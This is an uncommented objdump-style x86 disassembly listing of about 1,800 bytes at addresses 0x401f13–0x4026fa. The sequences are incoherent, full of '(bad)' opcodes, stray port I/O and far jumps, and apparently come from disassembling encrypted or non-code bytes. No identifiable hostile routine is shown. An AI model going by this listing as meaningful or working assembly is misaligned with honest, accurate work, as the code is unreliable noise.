  401f13:	push   ds
  401f14:	mul    BYTE PTR [eax+0x7f]
  401f17:	jecxz  0x401ed7
  401f19:	mov    bl,dh
  401f1b:	mov    dl,cl
  401f1d:	xchg   BYTE PTR [edx],al
  401f1f:	mov    ecx,0xcd81ef2c
  401f24:	sahf   
  401f25:	cmc    
  401f26:	pushw  ss
  401f28:	mov    ss,WORD PTR [esi+0xefe87ef]
  401f2e:	push   esi
  401f2f:	test   al,0x3e
  401f31:	cwde   
  401f32:	retf   
  401f33:	or     esi,DWORD PTR [eax+eax*1+0x6573acb5]
  401f3a:	out    dx,al
  401f3b:	add    BYTE PTR [ebp+0x3fd1a6bd],dl
  401f41:	(bad)  
  401f42:	and    DWORD PTR [eax-0x7eb54b0f],esp
  401f48:	fidivr WORD PTR ds:0x59771ef8
  401f4e:	out    dx,al
  401f4f:	push   es
  401f50:	push   0x1c
  401f52:	and    ah,BYTE PTR [edx-0x5f35722c]
  401f58:	and    BYTE PTR [eax+0x428142d6],al
  401f5e:	rcr    BYTE PTR [eax],0x5e
  401f61:	push   0xffffffb7
  401f63:	inc    esi
  401f64:	add    ecx,DWORD PTR [ebx+ebp*1+0x4c611fb9]
  401f6b:	cs push 0x5f
  401f6e:	ret    0x99a8
  401f71:	ss out dx,al
  401f73:	(bad)  
  401f74:	daa    
  401f75:	inc    ebp
  401f76:	std    
  401f77:	leave  
  401f78:	test   DWORD PTR [esi+0xbcaa104],0x734056e5
  401f82:	out    dx,eax
  401f83:	adc    bh,BYTE PTR [esi-0x4b]
  401f86:	or     ch,ah
  401f88:	add    BYTE PTR [edx-0x12],0x5c
  401f8c:	xchg   edi,eax
  401f8d:	push   0x298f1dad
  401f92:	loope  0x401f34
  401f94:	fild   DWORD PTR [edi+0x5b]
  401f97:	test   BYTE PTR [edx],ch
  401f99:	addr16 leave 
  401f9b:	rcr    DWORD PTR [esi-0x16],cl
  401f9e:	or     al,0x14
  401fa0:	gs mov dl,0x33
  401fa3:	nop/reserved BYTE PTR [edi+0x5a28a0f0]
  401faa:	nop
  401fab:	nop
  401fac:	ss inc ebp
  401fae:	mov    DWORD PTR [edx+0x5b],ebx
  401fb1:	clc    
  401fb2:	xlat   BYTE PTR ds:[ebx]
  401fb3:	(bad)  
  401fb4:	outs   dx,DWORD PTR ds:[esi]
  401fb5:	add    eax,0x1357d46e
  401fba:	jbe    0x401f5d
  401fbc:	arpl   bx,di
  401fbe:	retf   0x4ef1
  401fc1:	sub    DWORD PTR [ebp-0x7c5ea1d1],ecx
  401fc7:	jg     0x402033
  401fc9:	loope  0x401f74
  401fcb:	(bad)  
  401fcc:	pop    ecx
  401fcd:	pop    esi
  401fce:	pop    edi
  401fcf:	cmp    BYTE PTR [ebx+0x3d],dl
  401fd2:	ins    BYTE PTR es:[edi],dx
  401fd3:	shr    DWORD PTR [esi+0x57],cl
  401fd6:	jle    0x402011
  401fd8:	pop    esi
  401fd9:	adc    al,0x49
  401fdb:	inc    esp
  401fdc:	imul   edi,DWORD PTR [ebx+0x76],0x1b44139f
  401fe3:	loop   0x402042
  401fe5:	loope  0x401f7e
  401fe7:	mov    cl,0x43
  401fe9:	add    al,0xc4
  401feb:	ficomp WORD PTR [esi+0x58]
  401fee:	sub    BYTE PTR [ebx+ebx*1-0x66cba20b],dl
  401ff5:	pusha  
  401ff6:	fcomp  QWORD PTR [ebp+0x29082b0d]
  401ffc:	jecxz  0x401fff
  401ffe:	sti    
  401fff:	pop    esp
  402000:	aad    0x92
  402002:	out    dx,al
  402003:	adc    BYTE PTR [eax],cl
  402005:	mov    ebp,0x61202ea8
  40200a:	sar    DWORD PTR [eax+ebp*8+0x2b],0xf3
  40200f:	int3   
  402010:	leave  
  402011:	sub    eax,0x5dea7bee
  402016:	dec    ebx
  402017:	mov    bh,0x44
  402019:	ret    
  40201a:	jmp    DWORD PTR [eax-0x269ae430]
  402020:	ins    DWORD PTR es:[edi],dx
  402021:	loopne 0x401fea
  402023:	add    eax,0xa6d10263
  402028:	push   es
  402029:	test   BYTE PTR [esi-0x4dbfc4af],ch
  40202f:	push   es
  402030:	das    
  402031:	xor    BYTE PTR [edi-0x2fe74e60],ch
  402037:	lds    ebx,FWORD PTR [ebp+0xedf91cd]
  40203d:	jle    0x402092
  40203f:	pop    eax
  402040:	pop    esi
  402041:	pop    edi
  402042:	xor    cl,BYTE PTR [esi+0x3b0fb9]
  402048:	jle    0x4020aa
  40204a:	or     bh,BYTE PTR [eax]
  40204c:	call   0x5a179fab
  402051:	fucomi st,st(6)
  402053:	push   ebp
  402054:	sub    al,0x4f
  402056:	std    
  402057:	cmp    al,0xee
  402059:	inc    edi
  40205a:	cdq    
  40205b:	imul   esi,DWORD PTR [ecx+0x60],0x7a
  40205f:	xor    BYTE PTR [eax+0x11],bl
  402062:	xor    dl,BYTE PTR [ecx+0x172408fc]
  402068:	pop    ebp
  402069:	fidiv  DWORD PTR ds:0xdea93002
  40206f:	or     esi,DWORD PTR [ebx-0x115c025e]
  402075:	inc    ebx
  402076:	xchg   ebx,eax
  402077:	outs   dx,BYTE PTR ds:[esi]
  402078:	sub    DWORD PTR [esi-0x41558692],ebx
  40207e:	out    dx,al
  40207f:	ja     0x402011
  402081:	or     BYTE PTR [ebp-0x6f45e1c3],bh
  402087:	mov    cl,0x11
  402089:	aam    0xa0
  40208b:	xlat   BYTE PTR ds:[ebx]
  40208c:	loop   0x40210d
  40208e:	out    dx,al
  40208f:	sub    edi,esp
  402091:	jge    0x402027
  402093:	dec    esi
  402094:	dec    esi
  402095:	loop   0x4020f8
  402097:	clc    
  402098:	and    DWORD PTR [esi+0x62],ebx
  40209b:	inc    edi
  40209c:	adc    ebp,ecx
  40209e:	push   cs
  40209f:	dec    esp
  4020a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020a1:	xchg   edx,eax
  4020a2:	stos   BYTE PTR es:[edi],al
  4020a3:	push   esp
  4020a4:	pop    esi
  4020a5:	mov    ch,0xb9
  4020a7:	adc    BYTE PTR [esi-0x61],al
  4020aa:	sbb    DWORD PTR [ecx],ebp
  4020ac:	mov    BYTE PTR [edi],ah
  4020ae:	jns    0x402050
  4020b0:	xor    eax,0x1ec41e96
  4020b5:	jo     0x4020bd
  4020b7:	xchg   ebp,eax
  4020b8:	cld    
  4020b9:	jbe    0x4020a9
  4020bb:	sub    eax,0x25fe04ed
  4020c0:	jae    0x40206f
  4020c2:	mov    edx,0x6260c5f3
  4020c7:	push   esi
  4020c8:	pop    edx
  4020c9:	jle    0x402081
  4020cb:	outs   dx,BYTE PTR ds:[esi]
  4020cc:	fwait
  4020cd:	fwait
  4020ce:	sahf   
  4020cf:	ja     0x40212f
  4020d1:	jo     0x4020ff
  4020d3:	push   0x57
  4020d5:	mov    cl,0x2e
  4020d7:	imul   DWORD PTR [eax+0x17ba9e60]
  4020dd:	fnsave [edi-0x44]
  4020e0:	aam    0xad
  4020e2:	out    dx,al
  4020e3:	fbstp  TBYTE PTR ds:0xf563c5be
  4020e9:	dec    eax
  4020ea:	ins    BYTE PTR es:[edi],dx
  4020eb:	mov    eax,ds:0xb6ac8107
  4020f0:	cmp    eax,0x387b14a4
  4020f5:	pop    ebx
  4020f6:	je     0x402120
  4020f8:	loope  0x40214c
  4020fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020fb:	test   esi,ebp
  4020fd:	shl    DWORD PTR [ebx+0x68612722],1
  402103:	xchg   DWORD PTR [edx],esp
  402105:	fs repnz inc ebp
  402108:	sbb    al,0x20
  40210a:	jecxz  0x40218b
  40210c:	cmp    dh,BYTE PTR [edi+0x345e0c67]
  402112:	inc    edi
  402113:	xchg   ebp,eax
  402114:	inc    ecx
  402115:	cmp    BYTE PTR [esi+0x468de0a7],0xf3
  40211c:	mov    ds:0xbabfb900,al
  402121:	xchg   ebx,eax
  402122:	out    dx,al
  402123:	xchg   esi,eax
  402124:	pushf  
  402125:	aaa    
  402126:	jbe    0x4020f1
  402128:	xchg   edi,eax
  402129:	mov    esi,0xf70ba1a6
  40212e:	js     0x4020f5
  402130:	push   edx
  402131:	pushf  
  402132:	loope  0x4020ce
  402134:	pop    esi
  402135:	inc    eax
  402136:	or     ah,ah
  402138:	and    BYTE PTR [ebx],bl
  40213a:	xor    al,bh
  40213c:	scas   eax,DWORD PTR es:[edi]
  40213d:	pusha  
  40213e:	out    0x28,eax
  402140:	pop    ebp
  402141:	shl    DWORD PTR [edx],1
  402143:	cmp    DWORD PTR [esi+0x64],esi
  402146:	out    dx,al
  402147:	mov    ds:0x25f60161,al
  40214c:	or     DWORD PTR [eax-0x8],0xffffffa0
  402150:	mov    bh,0x7f
  402152:	push   esi
  402153:	jg     0x4021c1
  402155:	add    ah,dl
  402157:	or     ebx,DWORD PTR [esi-0x46]
  40215a:	mov    BYTE PTR [edx-0x50146fe6],dl
  402160:	push   esp
  402161:	popa   
  402162:	arpl   si,cx
  402164:	pop    esp
  402165:	int    0x9c
  402167:	cld    
  402168:	push   esi
  402169:	mov    dl,0xee
  40216b:	pop    ds
  40216c:	loop   0x402160
  40216e:	xchg   edi,eax
  40216f:	dec    edx
  402170:	lea    esp,[ebx-0x38e75f4e]
  402176:	sbb    BYTE PTR [eax+ecx*1],bh
  402179:	add    eax,0xc5e4b3e
  40217e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40217f:	xlat   BYTE PTR ds:[bx]
  402181:	xchg   edx,eax
  402182:	je     0x40215b
  402184:	bound  esp,QWORD PTR [eax-0x31]
  402187:	and    ebx,ebp
  402189:	xchg   DWORD PTR [edx],edx
  40218b:	sbb    eax,0xac92211b
  402190:	int    0xae
  402192:	out    dx,al
  402193:	mov    ah,0xb1
  402195:	cmp    eax,0xbc50b289
  40219a:	dec    esi
  40219b:	mov    eax,ds:0x283df3a4
  4021a0:	(bad)  
  4021a1:	les    ecx,FWORD PTR [ebx+0x22b57c0b]
  4021a7:	sub    DWORD PTR [esi-0x1f],edx
  4021aa:	xchg   edi,eax
  4021ab:	cmp    bl,BYTE PTR [edx-0x48]
  4021ae:	xchg   ecx,eax
  4021af:	addr16 xchg ebp,eax
  4021b1:	pop    ecx
  4021b2:	in     al,dx
  4021b3:	mov    dh,0xe0
  4021b5:	lock push ecx
  4021b7:	and    ecx,ebx
  4021b9:	in     eax,dx
  4021ba:	shl    esp,1
  4021bc:	arpl   WORD PTR [esi],di
  4021be:	mov    ecx,0x7f3fa6ac
  4021c3:	in     al,dx
  4021c4:	cmp    DWORD PTR [eax],esi
  4021c6:	xor    eax,DWORD PTR [ecx+0x3f]
  4021c9:	mov    al,ds:0x2ce6a197
  4021ce:	and    eax,0x4368cd97
  4021d3:	or     eax,0x69335d5e
  4021d8:	or     BYTE PTR [ecx],ch
  4021da:	leave  
  4021db:	(bad)
  4021de:	push   DWORD PTR [ecx]
  4021e0:	icebp  
  4021e1:	jl     0x4021d9
  4021e3:	aaa    
  4021e4:	repz scas al,BYTE PTR es:[edi]
  4021e6:	out    dx,al
  4021e7:	add    cl,0xd
  4021ea:	sbb    al,0xd0
  4021ec:	adc    al,BYTE PTR [ecx]
  4021ee:	push   ss
  4021ef:	mov    eax,ds:0x71c3e3d7
  4021f4:	bound  edi,QWORD PTR [edx+0xc9d7955]
  4021fa:	aaa    
  4021fb:	aad    0xa6
  4021fd:	je     0x402255
  4021ff:	push   esp
  402200:	mov    ebx,0xcca13f2f
  402205:	push   esi
  402206:	out    dx,eax
  402207:	sbb    al,dl
  402209:	mov    bh,0xd6
  40220b:	test   eax,0x12ae625d
  402210:	lods   eax,DWORD PTR ds:[esi]
  402211:	sub    bl,BYTE PTR [eax+0x7d6b724c]
  402217:	mov    eax,ds:0x26a631bb
  40221c:	pop    esp
  40221d:	mov    ecx,0x305ed8d1
  402222:	mov    ch,0xca
  402224:	push   cs
  402225:	(bad)  
  402226:	or     BYTE PTR [ebp+eax*8-0x7ed8febc],dl
  40222d:	loopne 0x4021ee
  40222f:	dec    edi
  402230:	xor    edx,DWORD PTR [ebx+0x425ea669]
  402236:	mov    eax,ds:0x6194d5b1
  40223b:	add    BYTE PTR [ecx],bl
  40223d:	push   ebx
  40223e:	jnp    0x402228
  402240:	and    al,0xab
  402242:	push   cs
  402243:	(bad)  
  402244:	push   esp
  402245:	push   edi
  402246:	inc    eax
  402247:	jbe    0x4022a6
  402249:	dec    edi
  40224a:	bound  ebx,QWORD PTR [esi]
  40224c:	aad    0xb8
  40224e:	outs   dx,DWORD PTR ds:[esi]
  40224f:	aad    0x86
  402251:	sbb    dh,bl
  402253:	mov    al,ds:0xd15ad292
  402258:	ins    BYTE PTR es:[edi],dx
  402259:	pop    ebx
  40225a:	cmp    DWORD PTR [edx+0x5e],ebp
  40225d:	mov    BYTE PTR [esp+esi*4],bh
  402260:	jp     0x4022cc
  402262:	adc    DWORD PTR [eax+eax*1+0x6031d95a],ecx
  402269:	pushf  
  40226a:	sub    BYTE PTR [ebp+ebx*2+0x470552a9],ch
  402271:	xchg   ecx,eax
  402272:	or     al,0xee
  402274:	pop    ebp
  402275:	out    dx,al
  402276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402277:	fnsave [esi+edi*2]
  40227a:	aad    0xb
  40227c:	cs pop edx
  40227e:	shl    BYTE PTR [eax+0x5e02ab7b],0xc4
  402285:	inc    ebp
  402286:	sub    DWORD PTR [ebp+0x5b],esi
  402289:	ret    0xe63a
  40228c:	lods   eax,DWORD PTR ds:[esi]
  40228d:	call   0x211e:0xb0835acd
  402294:	or     esp,DWORD PTR [ecx-0x26]
  402297:	mov    BYTE PTR ds:0x62c6fbd8,ch
  40229d:	push   0x4bf08f48
  4022a2:	lock xchg dl,al
  4022a5:	call   0x26f0:0xf37f210e
  4022ac:	inc    esi
  4022ad:	popa   
  4022ae:	outs   dx,BYTE PTR ds:[esi]
  4022af:	in     eax,dx
  4022b0:	sbb    al,0x4
  4022b2:	jmp    0x606e4c4e
  4022b7:	dec    ebx
  4022b8:	fs jmp 0x6006:0x5a423e93
  4022c0:	mov    esi,0xfc43334e
  4022c5:	pop    edi
  4022c6:	imul   edx,DWORD PTR [ecx+0x64],0xffffffa0
  4022ca:	addr16 leave 
  4022cc:	adc    edx,edx
  4022ce:	test   BYTE PTR [esi+0x76],bh
  4022d1:	cdq    
  4022d2:	sbb    BYTE PTR [eax+0x7f79436e],ah
  4022d8:	dec    esp
  4022d9:	pusha  
  4022da:	inc    ebx
  4022db:	retf   
  4022dc:	fwait
  4022dd:	jmp    0x40234b
  4022df:	add    bh,0x84
  4022e2:	xchg   BYTE PTR [eax],bl
  4022e4:	pop    esi
  4022e5:	push   cs
  4022e6:	mov    ch,BYTE PTR [ebx+0x4b]
  4022e9:	push   edi
  4022ea:	arpl   WORD PTR [ebp-0x110a9f0d],bp
  4022f0:	call   0x52537d1e
  4022f5:	aaa    
  4022f6:	out    dx,al
  4022f7:	push   eax
  4022f8:	(bad)  
  4022f9:	addr16 loope 0x402355
  4022fc:	and    al,0xb6
  4022fe:	cmp    esi,DWORD PTR [eax-0x55116c74]
  402304:	in     eax,0xc5
  402306:	jbe    0x402305
  402308:	mov    bh,0x31
  40230a:	out    dx,al
  40230b:	pushf  
  40230c:	daa    
  40230d:	dec    esi
  40230e:	pop    ds
  40230f:	(bad)  
  402310:	xchg   edi,eax
  402311:	xor    dl,bh
  402313:	mov    al,ds:0x61047cd1
  402318:	mov    dh,0x86
  40231a:	adc    al,0x91
  40231c:	fs stos DWORD PTR es:[edi],eax
  40231e:	pop    esp
  40231f:	enter  0x5971,0x67
  402323:	ret    0x8aaf
  402326:	cmc    
  402327:	sbb    al,dh
  402329:	mov    ch,0xd8
  40232b:	mov    al,ds:0xb55fa4ff
  402330:	(bad)  
  402331:	ja     0x40239f
  402333:	inc    edx
  402334:	pop    esi
  402335:	sub    eax,0x37566a0a
  40233a:	call   0x6aa1:0x1fb13e14
  402341:	push   edi
  402342:	jge    0x402377
  402344:	ret    0xa224
  402347:	aas    
  402348:	sub    edi,DWORD PTR [ecx+eiz*1-0x5cfe1b1]
  40234f:	repz shl DWORD PTR [eax-0x29],1
  402353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402354:	push   0xffffffcf
  402356:	(bad)  
  402357:	(bad)  
  402358:	add    bl,dh
  40235a:	out    dx,al
  40235b:	dec    esp
  40235c:	ret    0xb9ca
  40235f:	shl    ah,0x52
  402362:	popa   
  402363:	mov    eax,ds:0x5504522e
  402368:	(bad)  
  402369:	ficomp WORD PTR [edx-0x6119a238]
  40236f:	adc    edx,esp
  402371:	std    
  402372:	mov    edx,0x7a33fef7
  402377:	mov    eax,ds:0x26cba822
  40237c:	jbe    0x4023bc
  40237e:	pop    edi
  40237f:	mov    bh,0x5e
  402381:	xor    al,0xdd
  402383:	sub    ebx,DWORD PTR [edx+0x79]
  402386:	test   edx,0x1e06611f
  40238c:	or     DWORD PTR [esi-0x4803031],edx
  402392:	out    dx,al
  402393:	adc    ebp,DWORD PTR [ebp+ecx*1-0x26]
  402397:	arpl   WORD PTR [esi-0x7c6fafc5],si
  40239d:	aam    0xb9
  40239f:	mov    ds:0x9a804969,al
  4023a4:	sahf   
  4023a5:	jp     0x40233c
  4023a7:	loop   0x402407
  4023a9:	int    0xca
  4023ab:	fst    DWORD PTR [eax]
  4023ad:	sub    edi,edx
  4023af:	fcom   DWORD PTR [edi]
  4023b1:	popa   
  4023b2:	mov    bl,0xd5
  4023b4:	aad    0x29
  4023b6:	ds pushf 
  4023b8:	std    
  4023b9:	clc    
  4023ba:	jmp    0x402371
  4023bc:	add    BYTE PTR [esi],dh
  4023be:	retf   
  4023bf:	les    ecx,FWORD PTR [ecx+0x36587b0]
  4023c5:	popa   
  4023c6:	dec    eax
  4023c7:	pop    ebp
  4023c8:	cli    
  4023c9:	or     esi,ecx
  4023cb:	xchg   edx,eax
  4023cc:	icebp  
  4023cd:	jmp    DWORD PTR [edi+eax*2]
  4023d0:	rcr    cl,0x17
  4023d3:	jns    0x402416
  4023d5:	pop    esp
  4023d6:	into   
  4023d7:	or     BYTE PTR [ecx],ah
  4023d9:	cwde   
  4023da:	rcr    BYTE PTR [edi-0x60cc26f2],cl
  4023e0:	sahf   
  4023e1:	and    DWORD PTR [edx+0x1f5f0c39],edx
  4023e7:	mov    esi,0x80b76131
  4023ec:	jne    0x4023e3
  4023ee:	pop    ds
  4023ef:	add    al,0xf9
  4023f1:	pusha  
  4023f2:	mov    DWORD PTR [ebx],edi
  4023f4:	imul   esi,DWORD PTR [eax+0x49ad04f4],0xffffffee
  4023fb:	sahf   
  4023fc:	push   esp
  4023fd:	cmp    esp,ebp
  4023ff:	ins    DWORD PTR es:[edi],dx
  402400:	popf   
  402401:	jne    0x40242f
  402403:	mov    eax,ds:0xf38cd3b5
  402408:	rol    ch,1
  40240a:	cmp    edx,ebx
  40240c:	pop    esi
  40240d:	pushf  
  40240e:	std    
  40240f:	pop    es
  402410:	out    dx,eax
  402411:	mov    esp,0x606a48dd
  402416:	mov    bl,0x68
  402418:	fisubr WORD PTR [ebp+0x14]
  40241b:	pop    ebx
  40241c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40241d:	arpl   si,ax
  40241f:	inc    eax
  402420:	iret   
  402421:	pusha  
  402422:	mov    ah,0x57
  402424:	push   ds
  402425:	cld    
  402426:	sub    ecx,DWORD PTR [ebx+ebx*2+0x61]
  40242a:	and    dh,BYTE PTR ds:0x61a44401
  402430:	call   0xc6b8:0xdfb5eed1
  402437:	ins    DWORD PTR es:[edi],dx
  402438:	(bad)  
  402439:	mov    ebx,0xa7ada160
  40243e:	fdiv   DWORD PTR [eax-0x3a]
  402441:	push   eax
  402442:	adc    eax,0x71ec5eae
  402447:	test   DWORD PTR [ebx+0x54938ef5],ecx
  40244d:	jae    0x402423
  40244f:	shr    ecx,0x60
  402452:	test   eax,0x87fcf7cd
  402457:	fistp  WORD PTR [esi-0x1f]
  40245a:	out    0x7e,al
  40245c:	mov    dh,0xa2
  40245e:	mov    ds:0xd5609126,al
  402463:	test   bh,dl
  402465:	outs   dx,DWORD PTR ds:[esi]
  402466:	aam    0xbe
  402468:	stos   DWORD PTR es:[edi],eax
  402469:	test   al,0xd9
  40246b:	push   cs
  40246c:	pop    esi
  40246d:	add    al,0x3b
  40246f:	dec    ebp
  402470:	call   0xfaba:0xc1748a21
  402477:	mov    al,ds:0xf3e705e5
  40247c:	(bad)  
  40247e:	lods   al,BYTE PTR ds:[esi]
  40247f:	xchg   ecx,eax
  402480:	pop    esi
  402481:	inc    eax
  402482:	sbb    dl,BYTE PTR [edi]
  402484:	lahf   
  402485:	sbb    eax,0x45016cce
  40248a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40248c:	pop    eax
  40248d:	ffreep st(1)
  40248f:	sub    ch,bl
  402491:	xchg   BYTE PTR [esi],ch
  402493:	shl    ecx,1
  402495:	sbb    al,0xee
  402497:	sbb    ebp,DWORD PTR [ecx]
  402499:	mov    al,ds:0x2ba167b0
  40249e:	push   0xffffff9c
  4024a0:	xor    dl,BYTE PTR [edx-0x3]
  4024a3:	adc    bl,dh
  4024a5:	mov    ds:0x4c71bb0e,al
  4024aa:	add    bh,dh
  4024ac:	inc    ecx
  4024ad:	push   ss
  4024ae:	outs   dx,BYTE PTR ds:[esi]
  4024af:	jmp    0x611b:0x8d5a0484
  4024b6:	pop    ds
  4024b7:	xor    BYTE PTR [ecx-0x2b],bl
  4024ba:	popa   
  4024bb:	jl     0x402485
  4024bd:	push   0x531690f0
  4024c2:	jg     0x402448
  4024c4:	add    BYTE PTR [ecx+edx*2-0x39],al
  4024c8:	push   eax
  4024c9:	imul   edx,DWORD PTR [ebp-0x5f],0x19
  4024cd:	call   0x9d802fb0
  4024d2:	out    dx,al
  4024d3:	pop    edi
  4024d4:	mov    ebp,DWORD PTR [ecx+ebp*8+0x64c61ca]
  4024db:	leave  
  4024dc:	shr    eax,0xee
  4024df:	pop    es
  4024e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024e1:	bt     DWORD PTR [esi-0x5c],0xc5
  4024e6:	out    dx,al
  4024e7:	pushf  
  4024e8:	inc    DWORD PTR [edi-0x22]
  4024eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024ec:	sbb    ch,BYTE PTR [ebx]
  4024ee:	lock mov al,ds:0x4052d851
  4024f4:	aaa    
  4024f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024f6:	ja     0x40252d
  4024f8:	pop    esi
  4024f9:	icebp  
  4024fa:	pop    edi
  4024fb:	dec    ebp
  4024fc:	and    cl,BYTE PTR [ecx+0x5cf97f4d]
  402502:	ss repnz aam 0xf7
  402506:	dec    esp
  402507:	sub    BYTE PTR [edx],dh
  402509:	push   ecx
  40250a:	sbb    dl,bl
  40250c:	icebp  
  40250d:	(bad)  
  40250e:	out    0x90,eax
  402510:	push   esi
  402511:	retf   0x2efd
  402514:	pop    esi
  402515:	mov    DWORD PTR [ebx+ecx*2+0x77],edi
  402519:	inc    edx
  40251a:	xor    BYTE PTR [edx-0x336cded9],ah
  402520:	sbb    eax,0x5ed482b3
  402525:	adc    edi,DWORD PTR [esi-0xe]
  402528:	fimul  WORD PTR [ebx]
  40252a:	repz add ebx,0x51
  40252e:	icebp  
  40252f:	xrelease xchg BYTE PTR ds:0x52c68dae,al
  402536:	test   al,0x9f
  402538:	pop    esi
  402539:	sub    esi,DWORD PTR [esi]
  40253b:	push   eax
  40253c:	pushf  
  40253d:	mov    edx,0x60e99be8
  402542:	mov    DWORD PTR [eiz*1-0x713c408],esp
  402549:	(bad)  
  40254b:	xchg   edx,eax
  40254c:	lahf   
  40254d:	push   0xc9029ebe
  402552:	mov    dh,0xa0
  402554:	xchg   edi,eax
  402555:	loope  0x4025b4
  402557:	pop    edi
  402558:	jl     0x4024eb
  40255a:	retf   0x2974
  40255d:	pop    ecx
  40255e:	add    al,0x2b
  402560:	fisub  WORD PTR [edx+0x59c1a446]
  402566:	rcl    ecx,cl
  402568:	and    eax,0xfe9fc409
  40256d:	call   0x73ee:0xf54f8f90
  402574:	mov    BYTE PTR [esi-0xd],0x43
  402578:	xor    DWORD PTR cs:[esi-0x60],esi
  40257c:	add    al,0x4b
  40257e:	xchg   edi,eax
  40257f:	pop    ds
  402580:	mov    esi,0xb137441a
  402585:	mov    esi,gs
  402587:	push   cs
  402588:	call   0x7e8f:0xb40d81b3
  40258f:	mov    eax,ds:0x21554a
  402594:	xor    BYTE PTR [edx-0x15],ah
  402597:	sbb    DWORD PTR [esi-0x7b],ebx
  40259a:	in     al,dx
  40259b:	retf   
  40259c:	adc    cl,BYTE PTR [edx+0x4b]
  40259f:	lds    esi,FWORD PTR [ebx+0x60]
  4025a2:	xlat   BYTE PTR ds:[ebx]
  4025a3:	(bad)  
  4025a4:	mov    ecx,0x87183fe
  4025a9:	pop    edx
  4025aa:	fstp   TBYTE PTR [esi+ebx*2]
  4025ad:	sub    edi,DWORD PTR [esi-0x6465bbb4]
  4025b3:	add    BYTE PTR [esi],al
  4025b5:	popa   
  4025b6:	xlat   BYTE PTR ds:[ebx]
  4025b7:	fstp   QWORD PTR [eax+eax*1-0xf]
  4025bb:	adc    bl,BYTE PTR [edi-0xe]
  4025be:	add    bh,BYTE PTR [ebx-0x105140ff]
  4025c4:	(bad)  
  4025c5:	xor    ch,BYTE PTR [edi+ecx*8-0x7dc49f33]
  4025cc:	mov    esp,0x94c3c8e7
  4025d1:	cmp    eax,0x4951fbee
  4025d6:	imul   ebp,DWORD PTR [edi+0xd],0x4f
  4025da:	jp     0x40257c
  4025dc:	inc    eax
  4025dd:	dec    esi
  4025de:	jnp    0x4025c1
  4025e0:	push   ds
  4025e1:	jmp    0x9b3acd04
  4025e6:	lock out dx,eax
  4025e8:	fisubr DWORD PTR [edx]
  4025ea:	test   al,0x82
  4025ec:	adc    eax,0x98e123e4
  4025f1:	inc    edx
  4025f2:	in     al,0xa1
  4025f4:	mov    eax,ds:0xf3df8a35
  4025f9:	test   DWORD PTR [esi],edx
  4025fb:	jne    0x402674
  4025fd:	cmp    al,0xee
  4025ff:	pavgw  mm2,QWORD PTR [esi-0x27]
  402603:	xchg   esi,eax
  402604:	ret    
  402605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402606:	cmc    
  402607:	mov    al,ds:0x6d54c0ce
  40260c:	popf   
  40260d:	dec    eax
  40260e:	mov    esi,0xd5c93401
  402613:	daa    
  402614:	je     0x40267f
  402616:	inc    ebx
  402617:	(bad)  
  402619:	int3   
  40261a:	jbe    0x40268f
  40261c:	mov    eax,ds:0x50d2e060
  402621:	mov    bh,0xa7
  402623:	lds    esp,FWORD PTR [eax+0x22]
  402626:	out    dx,al
  402627:	test   BYTE PTR [esi],dl
  402629:	sub    eax,0xbfe1286b
  40262e:	mov    dl,0xa1
  402630:	pop    esp
  402631:	pop    edx
  402632:	cmp    ebx,esi
  402634:	fs or  al,0xa8
  402637:	fs in  eax,0x1b
  40263a:	out    dx,al
  40263b:	xor    eax,0x448c6475
  402640:	loopne 0x402630
  402642:	pop    ebp
  402643:	mov    eax,ds:0x6cde58cb
  402648:	mov    esi,0x5e5554b7
  40264d:	mov    ebx,DWORD PTR [esi-0x57]
  402650:	inc    esp
  402651:	daa    
  402652:	cmp    edi,0x35
  402655:	pusha  
  402656:	mov    al,0xc
  402658:	dec    edx
  402659:	inc    edx
  40265a:	xor    DWORD PTR [edi+0x1b],0xbb651c8c
  402661:	cmp    ebp,esi
  402663:	cmp    bl,BYTE PTR [esp+ecx*2+0x23]
  402667:	dec    esp
  402668:	mov    al,ds:0xab168f8
  40266d:	into   
  40266e:	sub    al,0x9b
  402670:	jmp    0xfa15:0xca45f007
  402677:	pusha  
  402678:	or     al,0xd7
  40267a:	lods   al,BYTE PTR ds:[esi]
  40267b:	push   0x422d048d
  402680:	pop    esi
  402681:	call   0x6a7:0xa13b41eb
  402688:	pop    esi
  402689:	jecxz  0x4026ca
  40268b:	mov    BYTE PTR [eax+0x17],dl
  40268e:	mov    WORD PTR [ebp+0x60],ds
  402691:	popa   
  402692:	mov    bh,0xfa
  402694:	jle    0x402622
  402696:	cmp    al,0xe0
  402698:	sub    ch,BYTE PTR ds:0x159379ef
  40269e:	mov    ds:0xf7fa36c1,al
  4026a3:	aaa    
  4026a4:	gs popa 
  4026a6:	pop    ebx
  4026a7:	test   BYTE PTR [esp+eax*2-0x5b],ch
  4026ab:	mov    ds:0x9952ca3f,al
  4026b0:	pop    esi
  4026b1:	or     al,0x36
  4026b3:	popa   
  4026b4:	and    al,al
  4026b6:	out    dx,eax
  4026b7:	push   ebx
  4026b8:	(bad)  
  4026b9:	pusha  
  4026ba:	jl     0x402719
  4026bc:	push   edi
  4026bd:	fucomp st(1)
  4026bf:	inc    edi
  4026c0:	ds jge 0x4026ad
  4026c3:	lds    esp,FWORD PTR [esi+0x12]
  4026c6:	jmp    0x40266c
  4026c8:	sahf   
  4026c9:	mov    eax,ds:0x60aa7d26
  4026ce:	test   ch,dl
  4026d0:	mov    eax,ds:0x5076e121
  4026d5:	cmp    ebp,esi
  4026d7:	rcr    DWORD PTR [edi-0x5e],0x2a
  4026db:	pop    ecx
  4026dc:	shl    ebp,cl
  4026de:	cmp    ecx,DWORD PTR [ebp-0x1ed6565b]
  4026e4:	inc    edi
  4026e5:	push   ds
  4026e6:	test   eax,0xee700047
  4026eb:	bound  esp,QWORD PTR [esi+0x49]
  4026ee:	lea    eax,[ebx+0x24]
  4026f1:	xor    bl,BYTE PTR [esi+0x13ddc5a1]
  4026f7:	pop    esi
  4026f8:	imul   ebp
  4026fa:	mov    ch,0x7a
